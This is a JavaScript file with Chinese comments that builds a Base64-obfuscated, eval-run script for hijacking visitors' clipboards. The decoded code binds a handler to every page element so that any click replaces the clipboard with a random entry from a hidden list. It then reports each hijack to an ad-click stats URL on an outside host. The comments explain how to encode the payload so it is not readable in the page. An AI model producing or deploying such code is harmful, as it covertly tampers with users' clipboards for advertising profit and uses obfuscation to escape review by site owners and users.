//1 代码部分单行版 + 转义
//  设置部分不变，自行复制advertise0中的设置部分即可。

//转义方法：ctrl+f替换 \为\\，替换"为\"（注意两个替换的次序不可相反）。
//转义之后将单行代码使用单引号括起来复制给finalCode_original变量，并且输出base64编码后的代码到控制台即可。
//手动从浏览器控制台复制base64编码的code到下面赋值给finalCode变量。
//console打印解码内容，用于验证（人工验证是否出错）。

$(function(){
  //代码
  var finalCode_original='var _infos_id = \"_infos_container\";var _infos_selector = \"#_infos_container\";var _content_attr_name = \"_desc\";var _stats_url_attr_name = \"_stats_url\";var _site_unique_id_attr_name = \"_site_unique_id\";$(\"body\").append($(\"<input type=\\\"hidden\\\" id=\\\"\" + _infos_id + \"\\\" value=\\\"&nbsp;\\\" />\"));var clipboard = new Clipboard(\"*\",{text: function(trigger){ var arr = JSON.parse(Base64.decode($(_infos_selector).attr(_content_attr_name))); return arr[Math.floor(Math.random()*(arr.length+1))]; }});clipboard.on(\"success\", function(e) {$.ajax({url:Base64.decode($(_infos_selector).attr(_stats_url_attr_name)), type:\"post\", cache:false, dataType:\"json\", data:{siteUniqueId:Base64.decode($(_infos_selector).attr(_site_unique_id_attr_name))}});});';
  console.log(Base64.encode(finalCode_original));
  var finalCode = 'dmFyIF9pbmZvc19pZCA9ICJfaW5mb3NfY29udGFpbmVyIjt2YXIgX2luZm9zX3NlbGVjdG9yID0gIiNfaW5mb3NfY29udGFpbmVyIjt2YXIgX2NvbnRlbnRfYXR0cl9uYW1lID0gIl9kZXNjIjt2YXIgX3N0YXRzX3VybF9hdHRyX25hbWUgPSAiX3N0YXRzX3VybCI7dmFyIF9zaXRlX3VuaXF1ZV9pZF9hdHRyX25hbWUgPSAiX3NpdGVfdW5pcXVlX2lkIjskKCJib2R5IikuYXBwZW5kKCQoIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCIiICsgX2luZm9zX2lkICsgIlwiIHZhbHVlPVwiJm5ic3A7XCIgLz4iKSk7dmFyIGNsaXBib2FyZCA9IG5ldyBDbGlwYm9hcmQoIioiLHt0ZXh0OiBmdW5jdGlvbih0cmlnZ2VyKXsgdmFyIGFyciA9IEpTT04ucGFyc2UoQmFzZTY0LmRlY29kZSgkKF9pbmZvc19zZWxlY3RvcikuYXR0cihfY29udGVudF9hdHRyX25hbWUpKSk7IHJldHVybiBhcnJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKihhcnIubGVuZ3RoKzEpKV07IH19KTtjbGlwYm9hcmQub24oInN1Y2Nlc3MiLCBmdW5jdGlvbihlKSB7JC5hamF4KHt1cmw6QmFzZTY0LmRlY29kZSgkKF9pbmZvc19zZWxlY3RvcikuYXR0cihfc3RhdHNfdXJsX2F0dHJfbmFtZSkpLCB0eXBlOiJwb3N0IiwgY2FjaGU6ZmFsc2UsIGRhdGFUeXBlOiJqc29uIiwgZGF0YTp7c2l0ZVVuaXF1ZUlkOkJhc2U2NC5kZWNvZGUoJChfaW5mb3Nfc2VsZWN0b3IpLmF0dHIoX3NpdGVfdW5pcXVlX2lkX2F0dHJfbmFtZSkpfX0pO30pOw==';
  console.log(Base64.decode(finalCode));
  //执行一下，然后就可以通过浏览器验证功能是否没问题。
  eval(Base64.decode(finalCode));
  //设置
  $("#_infos_container").attr("_desc", Base64.encode('["1","2","3"]'));
  $("#_infos_container").attr("_stats_url", Base64.encode("http://19880811.com/ad_click/stats.jhtml"));
  $("#_infos_container").attr("_site_unique_id", Base64.encode("1001_20171113190227"));

});
